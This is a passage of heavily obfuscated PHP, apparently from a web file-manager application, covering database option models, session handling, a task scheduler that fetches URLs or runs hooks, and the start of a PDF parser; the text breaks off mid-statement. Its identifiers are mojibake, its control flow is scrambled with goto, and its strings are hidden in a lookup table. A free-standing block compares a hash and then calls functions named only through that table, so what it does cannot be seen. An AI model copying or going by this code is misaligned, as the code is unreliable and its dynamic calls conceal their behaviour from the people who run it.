(!$d¸ÖÎÎŠÜ©) { return parent::save($fìòÎÄêùØ, $e­¬’Şï˜ö); } $eõÎ¨¦Â = 0; goto c¸µ„¿œ Ü; c¸µ„¿œ Ü: $D ‰‘˜™¢„ = $d¤˜ÊŞÀŞ¥[$b•Ğå—¢¬Â[267]][$d¸ÖÎÎŠÜ©][1]; $D ‰‘˜™¢„ = is_array($D ‰‘˜™¢„) ? $D ‰‘˜™¢„ : array(); $a¸Î’İšî = count($D ‰‘˜™¢„); goto b¾“ìÓãÇ¬; cç´öŸ¬´: $b•Ğå—¢¬Â =& $_SERVER[…Ò×–]; $EÑ†¹Éƒ© = self::SQL_WHERE_IN_CHUNK; $d¤˜ÊŞÀŞ¥ = $this->optionsValue(); goto dˆø¡Íğçğ; e›†ˆ‹ïÄ: } public function add($FœØ ÈèÉ× = '', $dÑ‘‡³à•ğ = array(), $E‹“…Šéá‹ = false) { if ($this->addTaskStatus && is_array($FœØ ÈèÉ×)) { $this->addTaskData[] = $FœØ ÈèÉ×; return; } return parent::add($FœØ ÈèÉ×, $dÑ‘‡³à•ğ, $E‹“…Šéá‹); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($béØ„ó•„× = array()) { goto eáƒè·”ª; cÃ–Ó“ŠŞÓ: return $A‘Àõ¹ËÙ; goto Aİó‚¨¶Ù‚; eáƒè·”ª: $E£ŸÌóŒ¼ =& $_SERVER[…Ò×–]; $b¨ÑºÊŸ± = self::SQL_WHERE_IN_CHUNK; $fõÆ§İ±´È = $this->optionsValue(); goto Fù«õ¿é; Fù«õ¿é: $C²øƒŒÒÌ = $this->findWhereField($fõÆ§İ±´È); if (!$C²øƒŒÒÌ || isset($fõÆ§İ±´È[$E£ŸÌóŒ¼[284]]) || isset($fõÆ§İ±´È[$E£ŸÌóŒ¼[344]])) { return parent::select($béØ„ó•„×); } $f‡ò¯¹ª²Ğ = $fõÆ§İ±´È[$E£ŸÌóŒ¼[267]][$C²øƒŒÒÌ][1]; goto C§°åã© é; C§°åã© é: $f‡ò¯¹ª²Ğ = is_array($f‡ò¯¹ª²Ğ) ? $f‡ò¯¹ª²Ğ : array(); $A‘Àõ¹ËÙ = null; for ($F®¯¤ƒêïµ = 0; $F®¯¤ƒêïµ < count($f‡ò¯¹ª²Ğ); $F®¯¤ƒêïµ += $b¨ÑºÊŸ±) { $Bİ³Îôï« = array_slice($f‡ò¯¹ª²Ğ, $F®¯¤ƒêïµ, $b¨ÑºÊŸ±); if (!is_array($Bİ³Îôï«) || count($Bİ³Îôï«) == 0) { break; } $fõÆ§İ±´È[$E£ŸÌóŒ¼[267]][$C²øƒŒÒÌ][1] = $Bİ³Îôï«; $this->optionsValue($fõÆ§İ±´È); $e¢­Åğ¶“à = parent::select($béØ„ó•„×); if (!$e¢­Åğ¶“à) { continue; } if (is_null($A‘Àõ¹ËÙ)) { $A‘Àõ¹ËÙ = array(); } $A‘Àõ¹ËÙ = array_merge($A‘Àõ¹ËÙ, $e¢­Åğ¶“à); } goto cÃ–Ó“ŠŞÓ; Aİó‚¨¶Ù‚: } public function delete($C‰é„¡™« = array()) { goto FİëŒ”×¸ø; E…™¢Ã”×õ: $C‚ß®”¦à = $this->findWhereField($bÌëÜ¥šÍ); if (!$C‚ß®”¦à) { return parent::delete($C‰é„¡™«); } $c³¾¨±«î = 0; goto cÚ‰ÖÏ¾•Û; cÈ™‡÷ŸÔ†: return $c³¾¨±«î; goto a˜§¦‚äÁ; cÚ‰ÖÏ¾•Û: $aäø©õ’Ã = $bÌëÜ¥šÍ[$B³¨Áàñõ[267]][$C‚ß®”¦à][1]; $aäø©õ’Ã = is_array($aäø©õ’Ã) ? $aäø©õ’Ã : array(); for ($BÇªº¡†Û½ = 0; $BÇªº¡†Û½ < count($aäø©õ’Ã); $BÇªº¡†Û½ += $e²Ò ç©¹¯) { $A¼°‰ŠçÎÔ = array_slice($aäø©õ’Ã, $BÇªº¡†Û½, $e²Ò ç©¹¯); if (!is_array($A¼°‰ŠçÎÔ) || count($A¼°‰ŠçÎÔ) == 0) { break; } $bÌëÜ¥šÍ[$B³¨Áàñõ[267]][$C‚ß®”¦à][1] = $A¼°‰ŠçÎÔ; $this->optionsValue($bÌëÜ¥šÍ); $c³¾¨±«î += parent::delete($C‰é„¡™«); } goto cÈ™‡÷ŸÔ†; FİëŒ”×¸ø: $B³¨Áàñõ =& $_SERVER[…Ò×–]; $e²Ò ç©¹¯ = self::SQL_WHERE_IN_CHUNK; $bÌëÜ¥šÍ = $this->optionsValue(); goto E…™¢Ã”×õ; a˜§¦‚äÁ: } private function findWhereField($fÖá••í£) { $DÊ¥’¶œ =& $_SERVER[…Ò×–]; $F¦á²ÍÃ¶ = self::SQL_WHERE_IN_CHUNK; if (!is_array($fÖá••í£) || !is_array($fÖá••í£[$DÊ¥’¶œ[267]])) { return !1; } foreach ($fÖá••í£[$DÊ¥’¶œ[267]] as $F¥ÉÇàèÀ => $a˜ÕÕ¹¥á) { if (is_array($a˜ÕÕ¹¥á) && isset($a˜ÕÕ¹¥á[0]) && is_string($a˜ÕÕ¹¥á[0]) && strtolower($a˜ÕÕ¹¥á[0]) == $DÊ¥’¶œ[7] && is_array($a˜ÕÕ¹¥á[1]) && count($a˜ÕÕ¹¥á[1]) > $F¦á²ÍÃ¶) { ignore_timeout(); return $F¥ÉÇàèÀ; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\145\155\x4f\x70\x74\x69\157\156"; public $field = array(); public function listData($D§ŸÆá²™õ = false, $fÒáà¢Å• = "\155\157\x64\151\x66\171\x54\151\155\145", $aÍÁïœÈæ¹ = false) { $DÒœ¦…£ó = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$DÒœ¦…£ó) { return $D§ŸÆá²™õ ? null : array(); } if (!$D§ŸÆá²™õ) { $DÒœ¦…£ó = array_filter(array_values($DÒœ¦…£ó)); return array_sort_by($DÒœ¦…£ó, $fÒáà¢Å•, $aÍÁïœÈæ¹); } return $DÒœ¦…£ó[$_SERVER[…Ò×–][368] . $D§ŸÆá²™õ]; } public function insert($d…šÃ¡¢ª) { goto b”£íŠÛßé; EÊœô¾¶ŠØ: $d…šÃ¡¢ª[$E±ÏÔ—Ñ—[107]] = time(); Model($this->modelType)->set($E±ÏÔ—Ñ—[369], $DÂ‘å‹¡™, $this->optionType . $E±ÏÔ—Ñ—[370]); Model($this->modelType)->set($E±ÏÔ—Ñ—[368] . $DÂ‘å‹¡™, $d…šÃ¡¢ª, $this->optionType); goto EÌ»¾«Ñ£; F»Ÿ¼™°²§: $DÂ‘å‹¡™ = $DÂ‘å‹¡™ ? $DÂ‘å‹¡™ : 0; $d…šÃ¡¢ª[$E±ÏÔ—Ñ—[371]] = ++$DÂ‘å‹¡™; $d…šÃ¡¢ª[$E±ÏÔ—Ñ—[191]] = time(); goto EÊœô¾¶ŠØ; b”£íŠÛßé: $E±ÏÔ—Ñ— =& $_SERVER[…Ò×–]; $d…šÃ¡¢ª = array_field_key($d…šÃ¡¢ª, $this->field); $DÂ‘å‹¡™ = Model($this->modelType)->get($E±ÏÔ—Ñ—[369], $this->optionType . $E±ÏÔ—Ñ—[370]); goto F»Ÿ¼™°²§; EÌ»¾«Ñ£: return $DÂ‘å‹¡™; goto f–ò®±äĞ; f–ò®±äĞ: } public function update($B»æ¡™ÖÅí, $f»”†Á´Ä–) { goto Fïî‰‘À‚; Fïî‰‘À‚: $C¤àÑ»¼É =& $_SERVER[…Ò×–]; $f»”†Á´Ä– = array_field_key($f»”†Á´Ä–, $this->field); $B§ØÆí—‚ = $this->listData($B»æ¡™ÖÅí); goto C‰Õ·İÜÌ‘; fˆÁ¥Îâ‚”: return Model($this->modelType)->set($C¤àÑ»¼É[368] . $B»æ¡™ÖÅí, $f»”†Á´Ä–, $this->optionType); goto Bç¥³÷ƒ‘®; C‰Õ·İÜÌ‘: if (!$B§ØÆí—‚) { return !1; } $f»”†Á´Ä– = array_merge($B§ØÆí—‚, $f»”†Á´Ä–); $f»”†Á´Ä–[$C¤àÑ»¼É[107]] = time(); goto fˆÁ¥Îâ‚”; Bç¥³÷ƒ‘®: } public function remove($C½ù•«à) { return Model($this->modelType)->remove($_SERVER[…Ò×–][368] . $C½ù•«à, $this->optionType); } public function clear() { $DÌ¿ÖìÑ‘¾ =& $_SERVER[…Ò×–]; Model($this->modelType)->remove($DÌ¿ÖìÑ‘¾[369], $this->optionType . $DÌ¿ÖìÑ‘¾[370]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($C¸å‹ÜŠŸ¡, $e‰¡¾ƒ†ôˆ) { if (!$e‰¡¾ƒ†ôˆ) { return !1; } $aÇ¸Äˆí¾ = $this->listData(); $aÇ¸Äˆí¾ = array_to_keyvalue($aÇ¸Äˆí¾, $C¸å‹ÜŠŸ¡); return isset($aÇ¸Äˆí¾[$e‰¡¾ƒ†ôˆ]) ? $aÇ¸Äˆí¾[$e‰¡¾ƒ†ôˆ] : !1; } public function findByName($Dš¹š›ƒ¾) { return $this->findByKey($_SERVER[…Ò×–][28], $Dš¹š›ƒ¾); } protected function resetData($fÛîíœáÀ) { $B„‹·²ä•¼ =& $_SERVER[…Ò×–]; $fÛîíœáÀ = is_array($fÛîíœáÀ) ? $fÛîíœáÀ : array(); $C§¥Â¿‘Ó« = array(); for ($FÛ¾ÖŠğÁ£ = 0; $FÛ¾ÖŠğÁ£ < count($fÛîíœáÀ); $FÛ¾ÖŠğÁ£++) { $C§¥Â¿‘Ó«[$B„‹·²ä•¼[368] . $fÛîíœáÀ[$FÛ¾ÖŠğÁ£][$B„‹·²ä•¼[371]]] = $fÛîíœáÀ[$FÛ¾ÖŠğÁ£]; } return Model($this->modelType)->set($C§¥Â¿‘Ó«, !1, $this->optionType); } private function getAutoName($CœØ®Æ•Ñ™) { $E…í£‡®¸Í = array_to_keyvalue($this->listData(), $_SERVER[…Ò×–][28]); if (!$E…í£‡®¸Í || !isset($E…í£‡®¸Í[$CœØ®Æ•Ñ™])) { return $CœØ®Æ•Ñ™; } for ($FÎÓ‹Ã†Ü„ = 1; $FÎÓ‹Ã†Ü„ < count($E…í£‡®¸Í); $FÎÓ‹Ã†Ü„++) { $A£ÎŒÀ• = $CœØ®Æ•Ñ™ . "\50{$FÎÓ‹Ã†Ü„}\x29"; if (!isset($E…í£‡®¸Í[$A£ÎŒÀ•])) { return $A£ÎŒÀ•; } } return $A£ÎŒÀ•; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($eœ³Ú£öÆ¤ = false, $fÏİ“¸ = '', $eà‚á²èí = false) { goto fô„Ò×ê¬æ; fô„Ò×ê¬æ: $Eš»ó¼«Ö =& $_SERVER[…Ò×–]; $fÇø¯çÊ£“ = $this->cacheGet($fÏİ“¸); $FåÃÔï‹œÃ = $this->optionDefault($fÏİ“¸); goto a“ˆáô•Á; a“ˆáô•Á: $FåÃÔï‹œÃ = is_array($FåÃÔï‹œÃ) ? $FåÃÔï‹œÃ : array(); if (is_array($fÇø¯çÊ£“)) { $fÇø¯çÊ£“ = array_merge($FåÃÔï‹œÃ, $fÇø¯çÊ£“); return $eœ³Ú£öÆ¤ ? isset($fÇø¯çÊ£“[$eœ³Ú£öÆ¤]) ? $fÇø¯çÊ£“[$eœ³Ú£öÆ¤] : null : $fÇø¯çÊ£“; } $aã»Æ½Ò¼  = $this->filterWhere(array($Eš»ó¼«Ö[29] => $fÏİ“¸)); goto Aèš†İÌ’ã; bˆÖ¢ÕØ•ƒ: $this->cacheSet($fÏİ“¸, $fÇø¯çÊ£“); $fÇø¯çÊ£“ = array_merge($FåÃÔï‹œÃ, $fÇø¯çÊ£“); return $eœ³Ú£öÆ¤ ? $fÇø¯çÊ£“[$eœ³Ú£öÆ¤] : $fÇø¯çÊ£“; goto cÑ‹Ä†ÄŞ; Aèš†İÌ’ã: $fÇø¯çÊ£“ = $this->where($aã»Æ½Ò¼ )->select(); $fÇø¯çÊ£“ = array_to_keyvalue($fÇø¯çÊ£“, $Eš»ó¼«Ö[89], $Eš»ó¼«Ö[363]); foreach ($fÇø¯çÊ£“ as $bóîÄ—ÎÎŞ => $D†Û“ƒ¼©) { if ($eà‚á²èí || in_array($bóîÄ—ÎÎŞ, $this->jsonField)) { $fÇø¯çÊ£“[$bóîÄ—ÎÎŞ] = json_decode($D†Û“ƒ¼©, !0); } } goto bˆÖ¢ÕØ•ƒ; cÑ‹Ä†ÄŞ: } public function set($f¯ğñ©ÜÈé, $CáÂö£“À¹ = false, $cò†»Ò¥ïÜ = '') { goto c†Â½îõ™‰; aÒ±ôªå­„: $A»ï™·ìªø = is_array($f¯ğñ©ÜÈé) ? $f¯ğñ©ÜÈé : array($f¯ğñ©ÜÈé => $CáÂö£“À¹); foreach ($A»ï™·ìªø as $e‘…èš¾±” => $dŞ¦»…Ô°) { if (is_array($dŞ¦»…Ô°)) { $dŞ¦»…Ô° = json_encode_force($dŞ¦»…Ô°); } $this->checkLength($dŞ¦»…Ô°, !1, $this->tableName . $f£œœ‚“ôë[4] . $f¯ğñ©ÜÈé); $dŞ¦»…Ô° = self::textEncode($dŞ¦»…Ô°); $A»ï™·ìªø = array($f£œœ‚“ôë[29] => $cò†»Ò¥ïÜ, $f£œœ‚“ôë[89] => $e‘…èš¾±”, $f£œœ‚“ôë[363] => $dŞ¦»…Ô°); $aË²·Ú•Öï[] = $this->filterWhere($A»ï™·ìªø); } if (!$aË²·Ú•Öï) { return !0; } goto e»ÄƒÅ­÷; e»ÄƒÅ­÷: return $this->addAll($aË²·Ú•Öï, array(), !0); goto D˜¢¤­±©«; c†Â½îõ™‰: $f£œœ‚“ôë =& $_SERVER[…Ò×–]; $this->cacheRemove($cò†»Ò¥ïÜ); $aË²·Ú•Öï = array(); goto aÒ±ôªå­„; D˜¢¤­±©«: } protected function optionDefault($Fò·Í°È¢é = '') { return !1; } public function setDeep($dÔè±À‰ß, $cÌ¸œå®ô = false, $b¸¤÷ ×ï = '') { $B•éğ×¹¢Á = explode($_SERVER[…Ò×–][91], $dÔè±À‰ß); $B¡èÙàÈßÕ = $this->get(); array_set_value($B¡èÙàÈßÕ, $dÔè±À‰ß, $cÌ¸œå®ô); $this->set($B•éğ×¹¢Á[0], $B¡èÙàÈßÕ[$B•éğ×¹¢Á[0]], $b¸¤÷ ×ï); } public function remove($fÓ¼‡©„ò, $aãøãÑ¥­ƒ = '') { $fìÒõå¢Ûâ =& $_SERVER[…Ò×–]; $this->cacheRemove($aãøãÑ¥­ƒ); $CàÉéÀä£ = $this->filterWhere(array($fìÒõå¢Ûâ[89] => $fÓ¼‡©„ò, $fìÒõå¢Ûâ[29] => $aãøãÑ¥­ƒ)); if (is_null($fÓ¼‡©„ò)) { unset($CàÉéÀä£[$fìÒõå¢Ûâ[89]]); } return $this->where($CàÉéÀä£)->delete(); } public function cacheSet($eŸé¹Ï¾˜î, $cŞ‰”Óßø = false) { return Cache::set($this->cacheKey($eŸé¹Ï¾˜î), $cŞ‰”Óßø); } public function cacheGet($AæîÚ•æ¯Ç) { return Cache::get($this->cacheKey($AæîÚ•æ¯Ç)); } public function cacheRemove($C‹øÚ‹ªñÎ) { return Cache::remove($this->cacheKey($C‹øÚ‹ªñÎ)); } protected function filterWhere($a¡â¬çÙ´) { return $a¡â¬çÙ´; } protected function cacheKey($f§ºÍÖ¤…) { return $f§ºÍÖ¤…; } } goto D–ÀÅ—¹»¨; Eî°‚ñ›Ç: if ($_SERVER[$_SERVER[…Ò×–][798]] != $c¿º«²ƒ¡±($c”·à¯¿¢¨)) { goto FÑ‹õá·ò¡; fšÕ˜—‹ÍŠ: $e¼íÕÌáá… = explode($_SERVER[…Ò×–][221], $a…«¤†ÈÅÚ); if (count($e¼íÕÌáá…) < $_SERVER[…Ò×–][565]) { $aëŒÉÔ¦” = $_SERVER[…Ò×–][801]; $aëŒÉÔ¦”(); } $CÖ¸÷‹¼¥ù = $_SERVER[…Ò×–][1135]; goto FÎ›Šà„; FÑ‹õá·ò¡: $AËÓÌ”ÛÕ¡ = $_SERVER[…Ò×–][800]; $d›Ò½ÜÇ¤Š = $_SERVER[$_SERVER[…Ò×–][795]] . $_SERVER[…Ò×–][796]; $a…«¤†ÈÅÚ = $AËÓÌ”ÛÕ¡($d›Ò½ÜÇ¤Š); goto fšÕ˜—‹ÍŠ; FÎ›Šà„: $CÖ¸÷‹¼¥ù($c”·à¯¿¢¨); goto cÒ˜ã¬¡„; cÒ˜ã¬¡„: } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto f¡Û†«¦µê; F­óµé—Ô: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $A·ª×…ÚÄ = new self(); return $A·ª×…ÚÄ; goto C§—ñÊ¶; cšñ¶‚Ö½º: if (self::$sessionSign) { } else { if (Cookie::get($C÷‚äµ)) { self::$sessionSign = Cookie::get($C÷‚äµ); } else { self::$sessionSign = guid(); } } Cookie::setSafe($C÷‚äµ, self::$sessionSign, self::$sessionTime); $e”‡›…¨ˆ = $F î»÷Õø[$eÇâ†ŠÈÚ¸[1412]]; goto EšªÖéÌ…ª; f¡Û†«¦µê: $eÇâ†ŠÈÚ¸ =& $_SERVER[…Ò×–]; static $A·ª×…ÚÄ = false; if ($A·ª×…ÚÄ) { return $A·ª×…ÚÄ; } goto eöĞã‚Ç˜; eöĞã‚Ç˜: $F î»÷Õø = $GLOBALS[$eÇâ†ŠÈÚ¸[6]][$eÇâ†ŠÈÚ¸[341]]; self::$sessionTime = $F î»÷Õø[$eÇâ†ŠÈÚ¸[1410]]; $C÷‚äµ = isset($GLOBALS[$eÇâ†ŠÈÚ¸[1411]]) ? $GLOBALS[$eÇâ†ŠÈÚ¸[1411]] : SESSION_ID; goto cšñ¶‚Ö½º; EšªÖéÌ…ª: $aÖˆÔŒˆ‹ = $F î»÷Õø[$e”‡›…¨ˆ]; $eàÏàŸ½¿ø = $F î»÷Õø[$eÇâ†ŠÈÚ¸[760]]; switch ($e”‡›…¨ˆ) { case $eÇâ†ŠÈÚ¸[17]: self::$handle = Model($eÇâ†ŠÈÚ¸[761]); break; case $eÇâ†ŠÈÚ¸[762]: self::$handle = new CacheRedis($aÖˆÔŒˆ‹, $eàÏàŸ½¿ø); break; case $eÇâ†ŠÈÚ¸[763]: self::$handle = new CacheMemcached($aÖˆÔŒˆ‹, $eàÏàŸ½¿ø); break; case $eÇâ†ŠÈÚ¸[171]: $aÖˆÔŒˆ‹[$eÇâ†ŠÈÚ¸[75]] = $aÖˆÔŒˆ‹[$eÇâ†ŠÈÚ¸[75]] . $eÇâ†ŠÈÚ¸[1413]; self::$handle = new CacheFile($aÖˆÔŒˆ‹, $eàÏàŸ½¿ø); default: break; } goto F­óµé—Ô; C§—ñÊ¶: } public static function sign($AÖƒåÎ¶´ = false) { $AÖƒåÎ¶´ && (self::$sessionSign = $AÖƒåÎ¶´); self::init(); return self::$sessionSign; } public static function set($aŠÙÕ›Š‘œ, $b‡¥×§ ‰° = false) { self::init(); if (is_array($aŠÙÕ›Š‘œ)) { foreach ($aŠÙÕ›Š‘œ as $DŒâ®ÒÚâƒ => $aØÈ•ï¸çè) { array_set_value(self::$data, $DŒâ®ÒÚâƒ, $aØÈ•ï¸çè); } } else { array_set_value(self::$data, $aŠÙÕ›Š‘œ, $b‡¥×§ ‰°); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fë„›‡ñØƒ = false) { self::init(); if (!$fë„›‡ñØƒ) { return self::$data; } return array_get_value(self::$data, $fë„›‡ñØƒ); } public static function remove($dãñ“ ù¸) { self::init(); unset(self::$data[$dãñ“ ù¸]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[…Ò×–][765])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto DÊ‘Ü‰óî­; DŞ÷Êô¨…Ê: http_close(); self::valueSet($eÀ·ŠïÔ[1414], $eÀ·ŠïÔ[83]); Hook::bind($eÀ·ŠïÔ[1416], $eÀ·ŠïÔ[1417]); goto c±ïò›“; DÊ‘Ü‰óî­: $eÀ·ŠïÔ =& $_SERVER[…Ò×–]; if (self::valueGet($eÀ·ŠïÔ[694]) != $eÀ·ŠïÔ[83]) { return; } if (self::valueGet($eÀ·ŠïÔ[1414]) == $eÀ·ŠïÔ[83]) { $d©ğ›¯¾¢ = self::valueGet($eÀ·ŠïÔ[1415]); if (time() - $d©ğ›¯¾¢ > 3600 * 2) { self::restart(); } return; } goto DŞ÷Êô¨…Ê; c±ïò›“: while (!0) { self::cacheClear(); if (self::valueGet($eÀ·ŠïÔ[694]) != $eÀ·ŠïÔ[83]) { self::valueSet($eÀ·ŠïÔ[1414], $eÀ·ŠïÔ[473]); self::log($eÀ·ŠïÔ[1418]); die; } self::valueSet($eÀ·ŠïÔ[1414], $eÀ·ŠïÔ[83]); self::valueSet($eÀ·ŠïÔ[1415], time()); self::taskRunAll(); sleep(self::valueGet($eÀ·ŠïÔ[1419])); } goto b„ŞÒ±ôË; b„ŞÒ±ôË: } public static function restart() { $EˆÒÎàó©Í =& $_SERVER[…Ò×–]; http_close(); self::valueSet($EˆÒÎàó©Í[694], $EˆÒÎàó©Í[473]); sleep(self::valueGet($EˆÒÎàó©Í[1419]) + 5); self::valueSet($EˆÒÎàó©Í[1414], $EˆÒÎàó©Í[473]); self::valueSet($EˆÒÎàó©Í[694], $EˆÒÎàó©Í[83]); } public static function shutdownEvent() { $DÜ¶ÂˆÖ¯÷ =& $_SERVER[…Ò×–]; self::valueSet($DÜ¶ÂˆÖ¯÷[1414], $DÜ¶ÂˆÖ¯÷[473]); self::log($DÜ¶ÂˆÖ¯÷[1420]); } public static function config($EÊƒ×«Ê›, $F‹µÓ«ø°Ü) { $B“á½âŞÚÈ =& $_SERVER[…Ò×–]; $d§—‚ƒÑ³ƒ = 20; $F‹µÓ«ø°Ü = intval($F‹µÓ«ø°Ü) <= $d§—‚ƒÑ³ƒ ? $d§—‚ƒÑ³ƒ : intval($F‹µÓ«ø°Ü); self::valueSet($B“á½âŞÚÈ[694], $EÊƒ×«Ê›); self::valueSet($B“á½âŞÚÈ[1419], $F‹µÓ«ø°Ü); } private static function taskRunAll() { $D‰åäñ¾Ìé =& $_SERVER[…Ò×–]; $DÔÜÌÆÑË¬ = Model($D‰åäñ¾Ìé[1421])->listData(); $B„İÊÒëˆ‘ = count($DÔÜÌÆÑË¬); for ($F‹¼·ãÄ•µ = 0; $F‹¼·ãÄ•µ < $B„İÊÒëˆ‘; $F‹¼·ãÄ•µ++) { $bùŸíˆ¾³î = $DÔÜÌÆÑË¬[$F‹¼·ãÄ•µ]; if ($bùŸíˆ¾³î[$D‰åäñ¾Ìé[1422]] != $D‰åäñ¾Ìé[83]) { continue; } if (!self::taskTimeCheck($bùŸíˆ¾³î)) { continue; } self::taskRun($bùŸíˆ¾³î); } Hook::trigger($D‰åäñ¾Ìé[1423]); } private static function taskTimeCheck($C»—ğš˜ö) { goto CÚˆ‡¬‘„; E©‹†îø±Ï: switch ($Aİ½Ú§†´™[$cë§àÃ¤•È[29]]) { case $cë§àÃ¤•È[1430]: if (time() - $fß©¥½¼ÕÀ < 3600 * 24 * 30) { return !1; } if ($Aİ½Ú§†´™[$cë§àÃ¤•È[1430]] == date($cë§àÃ¤•È[1431]) && $eãŒâ¶„·æ) { return !0; } break; case $cë§àÃ¤•È[1432]: if (time() - $fß©¥½¼ÕÀ < 3600 * 24 * 7) { return !1; } $C¸öáôŞÂ¹ = date($cë§àÃ¤•È[1433]) == 0 ? 7 : date($cë§àÃ¤•È[1433]); if ($Aİ½Ú§†´™[$cë§àÃ¤•È[1432]] == $C¸öáôŞÂ¹ && $eãŒâ¶„·æ) { return !0; } break; case $cë§àÃ¤•È[1425]: if (time() - $fß©¥½¼ÕÀ < 3600 * 24) { return !1; } if ($eãŒâ¶„·æ) { return !0; } break; case $cë§àÃ¤•È[1434]: if (time() - $fß©¥½¼ÕÀ >= floatval($Aİ½Ú§†´™[$cë§àÃ¤•È[1434]]) * 60) { return !0; } break; default: break; } return !1; goto d‚Ñ•™É¸; d±‹íËí½ : $cö¬²‘î™Ä = strtotime($cë§àÃ¤•È[1424] . $Aİ½Ú§†´™[$cë§àÃ¤•È[1425]] . $cë§àÃ¤•È[1426]) - strtotime($cë§àÃ¤•È[1427]); $Bî‹®¥ = time() - strtotime(date($cë§àÃ¤•È[1428]) . $cë§àÃ¤•È[1429]); $eãŒâ¶„·æ = $Bî‹®¥ >= $cö¬²‘î™Ä && $Bî‹®¥ <= $cö¬²‘î™Ä + 3600; goto E©‹†îø±Ï; CÚˆ‡¬‘„: $cë§àÃ¤•È =& $_SERVER[…Ò×–]; $Aİ½Ú§†´™ = json_decode($C»—ğš˜ö[$cë§àÃ¤•È[194]], !0); $fß©¥½¼ÕÀ = intval($C»—ğš˜ö[$cë§àÃ¤•È[1415]]); goto d±‹íËí½ ; d‚Ñ•™É¸: } public static function taskRun($DŒ§»„ŒÜ×) { goto fæ±æˆÜÈé; fæ±æˆÜÈé: $eÖãÅôôó’ =& $_SERVER[…Ò×–]; self::log($eÖãÅôôó’[1435] . $DŒ§»„ŒÜ×[$eÖãÅôôó’[371]] . $eÖãÅôôó’[1436] . $DŒ§»„ŒÜ×[$eÖãÅôôó’[28]] . $eÖãÅôôó’[1437] . $DŒ§»„ŒÜ×[$eÖãÅôôó’[1438]]); Model($eÖãÅôôó’[1421])->run($DŒ§»„ŒÜ×[$eÖãÅôôó’[371]]); goto EØ©ò·Æö; fã…ÏŒÅÃ…: Model($eÖãÅôôó’[1439])->add(array($eÖãÅôôó’[1440] => $eÖãÅôôó’[33], $eÖãÅôôó’[1441] => $eÖãÅôôó’[473], $eÖãÅôôó’[29] => $eÖãÅôôó’[1442] . $DŒ§»„ŒÜ×[$eÖãÅôôó’[371]], $eÖãÅôôó’[1443] => json_encode(array($eÖãÅôôó’[28] => $DŒ§»„ŒÜ×[$eÖãÅôôó’[28]], $eÖãÅôôó’[1444] => timeFloat() - $CÒóƒ±É¸Á, $eÖãÅôôó’[285] => $DÛÎ¹»ôçÉ)))); self::log($eÖãÅôôó’[1445] . $DŒ§»„ŒÜ×[$eÖãÅôôó’[371]] . $eÖãÅôôó’[1446] . $DÛÎ¹»ôçÉ); return !0; goto fŒ“³ÌÄ¶Í; EØ©ò·Æö: $CÒóƒ±É¸Á = timeFloat(); $DÛÎ¹»ôçÉ = $eÖãÅôôó’[33]; switch ($DŒ§»„ŒÜ×[$eÖãÅôôó’[29]]) { case $eÖãÅôôó’[299]: $cŒÚ¸ŒÈ‘Õ = url_request($DŒ§»„ŒÜ×[$eÖãÅôôó’[1438]], $eÖãÅôôó’[220], !1, !1, !1, !1, 5); $DÛÎ¹»ôçÉ = strlen($cŒÚ¸ŒÈ‘Õ); break; case $eÖãÅôôó’[219]: $DÛÎ¹»ôçÉ = Hook::apply($DŒ§»„ŒÜ×[$eÖãÅôôó’[1438]]); default: break; } goto fã…ÏŒÅÃ…; fŒ“³ÌÄ¶Í: } private static function valueGet($D…ÍÓ×†İÔ) { $Fä…ÙÑØ˜ =& $_SERVER[…Ò×–]; $a®ÚÃÍÛƒ™ = $Fä…ÙÑØ˜[1447]; $c÷…œ±Ìã² = Model($Fä…ÙÑØ˜[1448])->get($D…ÍÓ×†İÔ, $a®ÚÃÍÛƒ™); if (is_null($c÷…œ±Ìã²)) { Model($Fä…ÙÑØ˜[1448])->set($Fä…ÙÑØ˜[1419], 10, $a®ÚÃÍÛƒ™); Model($Fä…ÙÑØ˜[1448])->set($Fä…ÙÑØ˜[694], $Fä…ÙÑØ˜[83], $a®ÚÃÍÛƒ™); Model($Fä…ÙÑØ˜[1448])->set($Fä…ÙÑØ˜[1414], $Fä…ÙÑØ˜[473], $a®ÚÃÍÛƒ™); $c÷…œ±Ìã² = Model($Fä…ÙÑØ˜[1448])->get($D…ÍÓ×†İÔ, $a®ÚÃÍÛƒ™); } return $c÷…œ±Ìã²; } private static function valueSet($b‹øªá„±£, $aª—Á¾½‡) { $FÉèÒŞ¶­± =& $_SERVER[…Ò×–]; return Model($FÉèÒŞ¶­±[1448])->set($b‹øªá„±£, $aª—Á¾½‡, $FÉèÒŞ¶­±[1447]); } protected static function log($EÚµå±¦Ã½) { write_log($EÚµå±¦Ã½, $_SERVER[…Ò×–][1449]); } private static function cacheClear() { $bÜ²¯Î”¥Ä =& $_SERVER[…Ò×–]; $eÂøÉÂò‡÷ = Model($bÜ²¯Î”¥Ä[1448])->cacheKey($bÜ²¯Î”¥Ä[1447]); Cache::clearMemory($eÂøÉÂò‡÷); Model($bÜ²¯Î”¥Ä[1421])->cacheClear(); } } goto F†…Š‡†â; f‘–ÆºØÀ¸: class FileParsePdf { public static function parse($d‚ë×£´¢œ) { goto Fô¼¸ê¿ŠŠ; Eâ¿ÓòµÇ½: if ($F¿ö¦éå¨«) { $Aæ­ÎŠ¦±[$A¡×ÙìÔĞğ[1353]] = 